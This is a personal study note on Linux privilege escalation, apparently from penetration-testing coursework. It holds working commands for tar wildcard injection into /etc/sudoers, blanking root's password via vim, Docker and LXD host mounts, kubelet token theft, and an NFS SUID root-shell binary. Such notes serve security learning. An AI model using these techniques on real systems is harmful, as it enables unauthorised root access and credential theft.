```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
> Other [[Privilege Escalation]] page
## Path Abuse
If we can modify a user's path, we could potentially run a malicious version of a binary if it is found earlier in the path. eg. `export PATH=.:${PATH}` will add the current directory.

## Wildcard Abuse
| Character | Significance                                                                                            |
| --------- | ------------------------------------------------------------------------------------------------------- |
| `*`       | Matches any number of characters in a file name                                                         |
| `?`       | Matches a single character                                                                              |
| `[ ]`     | Brackets enclose characters and can match any single one at the defined position                        |
| `~`       | Expands to the user's home directory or can have another username appended to refer to that user's home |
| `-`       | A hyphen within brackets will denote a range of characters                                              |
### Tar flags example
If we find a backup cron job (that runs every minute) that does something like:
```bash
*/01 * * * * cd /home/some-user && tar -zcf /home/some-user/backup.tar.gz *
```
We can abuse the `*` wildcard here by creating files with names of the CLI flags.
```bash
$ echo 'echo "some-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > "--checkpoint=1"
```

## Escaping Restricted Shells
Restricted shells limit a user's ability to execute commands. They can limit what commands can be run and in what directories. Some examples include `rbash`, `rksh`, `rzsh` in linux and the `Restricted-access Shell` in windows.

Sometimes there are vectors we can use in these shells to run arbitrary commands and escape the shell. For examples:
Suppose a shell limits us to `ls -l`, we might be able to execute commands as arguments `ls -l $(pwd)`.

We could use features like *command substitution (using backticks)*, *command chaining (`;` `|`)*, *using environment variables to modify commands*, and *shell functions*.

List available commands with `compgen -c`.

## Special Permissions
### SETUID & SETGID
The `setuid` permissions allows a user to execute something as another user, typically with elevated privileges. This can be seen in `ls` with an `s`.
```bash
-rwsr-xr-x 1 root root 16728 Sep 1 19:06 /home/hr/payroll
```

The `setgid` allows you to run a binary as if you were part of the group that created them. These can all be found with:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
> More info [here](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)

## GTFOBins
The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be used to bypass security restrictions. Each page details how a binary can be used to:
- Break out of restricted shells
- Elevate privileges
- Spawn reverse shells
- Transfer files

## Privileged Groups
### LXC / LXD
`LXD` is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group, we can abuse this as its a privileged group. We can make a privileged LXD container that mounts the host file system.
1. Ensure you are in the `lxd` group
2. Get a container image eg. Alpine
3. Start LXD : `lxd init` (*this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) can help with this*)
4. Import local image : `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
5. Start a privileged container : `lxc init alpine [name] -c security.privileged=true`
6. Mount the host filesystem : `lxc config device add [name] mydev disk source=/ path=/mnt/root recursive=true`
7. Start the container : `lxc start [name]`
8. Exec into the container : `lxc exec [name] /bin/sh`

### Docker
The docker group is essentially root access to the file system without a password. Members can create new docker containers and mount the file system: `docker run -v /root:/mnt -it ubuntu`

### Disk
Users in the `disk` group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device. An attacker with these privileges can use `debugfs` to access the entire filesystem with root access.

### ADM
The `adm` group is able to read all logs in `/var/log`, this could lead to sensitive information disclosure.

## Capabilities
Linux capabilities are a security feature that allows the OS to give specific privileges to processes. We can sometimes grant capabilities to processes that aren't adequately sandboxed or isolated, allowing for privileges to be escalated.

Ubuntu has the `setcap` command for setting capabilities for an executable.
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Some useful capabilities are:

| Capability             | Description                                                                                                                                                   |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`        | Perform admin actions such as **modifying system files or system settings**                                                                                   |
| `cap_sys_chroot`       | Change the root directory for the current process, **access files and directories**                                                                           |
| `cap_sys_ptrace`       | Can attach to and debug other processes, potentially allowing for the **interception of sensitive information or modify the behaviour of the other process**. |
| `cap_sys_nice`         | Raise or lower the priority of processes, **could gain access to resources that were restricted**                                                             |
| `cap_sys_time`         | Can modify system clock, potentially allowing it to **manipulate timestamps or cause other processes to behave in unexpected ways**                           |
| `cap_sys_resource`     | Can modify system resource limits, such as max open file descriptors, or max memory allocation                                                                |
| `cap_sys_module`       | Allows for loading and unloading kernel modules, potentially allowing **modification of OS behaviours or revealing sensitive information**                    |
| `cap_net_bind_service` | Allows binding to network ports, potentially allowing it to **gain access to sensitive information or perform unauthorised actions**                          |
| `cap_setuid`           | Allows a process to set its effective user ID, this includes `root`                                                                                           |
| `cap_setgid`           | Allows the process to set its effective group ID, this includes the `root` group                                                                              |
| `cap_dac_override`     | Allows bypassing of file read, write, and execute permission checks                                                                                           |
When setting values with `setcap` we need to specify the capability as well as the value to set it too

| Capability Values | Description                                                                                                                                                                                                                                                      |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`               | Sets the specified capability for the executable but does not grant any privileges. This can be used to clear a previously set capability.                                                                                                                       |
| `+ep`             | Grants the effective and permitted privileges. This allows for the privileges the capability allows but not any others. The effective privilege grants them immediately, this is useful for applications that are not "capability-aware" and do not self-manage. |
| `+ei`             | Grants sufficient and inheritable privileges for the capability. This allows actions the capability allows but also allows any child processes to inherit the capability.                                                                                        |
| `+p`              | Grants the permitted privileges for the capability. Allows actions the capability allows but does not allow other actions.                                                                                                                                       |
Capabilities can be enumerated with:
```bash
getcap [binary]
```
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
> Tools like [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) will do this automatically

If we found a binary such as `vim` that has the `cap_dac_override=eip` capability, we could use it to modify a system file:
```bash
$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip

$ /usr/bin/vim.basic /etc/passwd
```
(*This can also be done in a non-interactive way*)
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
> This removes the password field making it so root has no password.

## Docker
Aside from shared directories via mounts and volumes, we can do a number of other attacks via docker.

```bash
docker run --rm -it --privileged -v /:/hostsys [img] /bin/bash
```

If the docker socket is exposed inside a container, we could install docker and point it to the socket file, this would allow us to interact with the docker daemon.

```bash
docker -H unix:///app/docker.sock ps
```

We can use this to elevate our privileges as we can create other containers.

```bash
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

docker -H unix:///app/docker.sock exec -it [id] /bin/bash
```

This could allow us to gain additional access or even step towards escaping our container entirely.

If we are on the original host and find that the `docker.sock` is writable, we can escalate our privileges.
```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Kubernetes
Kubernetes security is split into several domains:
- Cluster infrastructure security - *Actual hardware the cluster is made up of*
- Cluster configuration security - *Software security configuration of the k8s deployment*
- Application security - *Applications running inside the cluster*
- Data security - *Data stored/processed within the cluster*
### Control Plane
The Control Plane serves as the management layer in a k8s cluster. It consists of several crucial components:
- **etcd** : 2379/tcp, 2380/tcp
- **API Server** : 6443/tcp
- **Scheduler** : 10251/tcp
- **Controller Manager** : 10252/tcp
- **Kubelet API** : 10250/tcp
- **Read-Only Kubelet API** : 10255/tcp

The **Scheduler** (based on the **API Server**) maintains a state of the cluster, and schedules new pods on the nodes. After a node has been decided for a pod, the **API Server** updates the **etcd**.

> By default in many K8s deployments, the Kubelet allows anonymous access. `curl https://[ip]:10250/pods -k | jq .`

### Kubeletctl
The [kubeletctl](https://github.com/cyberark/kubeletctl) tool is a pentesting tool for k8s. It can do a variety of scans and helpful functions against the kubelet API.
```bash
kubeletctl -i --server [ip] pods
```
```bash
kubeletctl -i --server [ip] scan rce
```
```bash
kubeletctl -i --server [ip] exec "id" -p nginx -c nginx
```

We could use the tool to extract serviceaccount tokens and certs:
```bash
kubelet -i --server [ip] exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
```bash
kubelet --server [ip] exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

We can then list our privileges with the stolen token:
```bash
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://[ip]:6443 auth can-i --list
```
This token could then be used further to interact with the cluster such as creating pods etc

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default  
spec: 
  containers: 
  - name: privesc 
    image: nginx:1.14.2 
    volumeMounts: 
    - mountPath: /root
      name: mount-root-into-mnt 
  volumes: 
  - name: mount-root-into-mnt 
    hostPath: 
      path: / 
  automountServiceAccountToken: true
  hostNetwork: true
```
> This pod YAML allows us to mount the root directory of the node

## Passive Traffic Capture for Credentials
We can use a tool like `tcpdump` or [net-creds](https://github.com/DanMcInerney/net-creds) or [PCredz](https://github.com/lgandx/PCredz) to look for plaintext credentials or sensitive information over the network.

## Weak NFS Privileges
We can view all Network File Shares on a server's export list with `showmount -e [ip]`. When setting up an NFS volume, various options can be set, some of which affect the security:
- `root_squash` : Changes the root user (if used to access the share) to `nfsnobody` which is an underprivileged account. This means that an attacker can't upload binaries with the SUID bit set as it will be owned by the `nfsnobody` user instead.
- `no_root_squash` : This allows remote users to connect to the share as the local root user. Allowing the upload of malicious files with the SUID bit set.

```bash
cat /etc/exports
```

We can use this to create a malicious file:
1. Create a binary with the SETUID bit as our local root user.
2. Mount an NFS directory from the remote server that has `no_root_squash`.
3. Copy our binary to the mount.
4. Set the SUID bit

```bash
$ cat shell.c 

#include <stdio.h> 
#include <sys/types.h> 
#include <unistd.h> 
#include <stdlib.h> 
int main(void) 
{ 
	setuid(0); 
	setgid(0); 
	system("/bin/bash"); 
}

$ gcc shell.c -o shell
$ sudo mount -t nfs [ip]:/tmp /mnt
$ cp shell /mnt
$ chmod u+s /mnt/shell
```
Then we can switch back to the target on a low privileged session and execute the binary to obtain the root shell.

## Hijacking Tmux Sessions
Some user's may leave privileged tmux sessions detached that we could hijack.

Eg. a new shared session with a modified ownership could exist.
```bash
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```

If we compromised a user in the `devs` group, we could steam this session.
```bash
# Check for tmux sessions
ps aux | grep tmux

# Confirm permissions
ls -la /shareds

# Steal session
tmux -S /shareds
```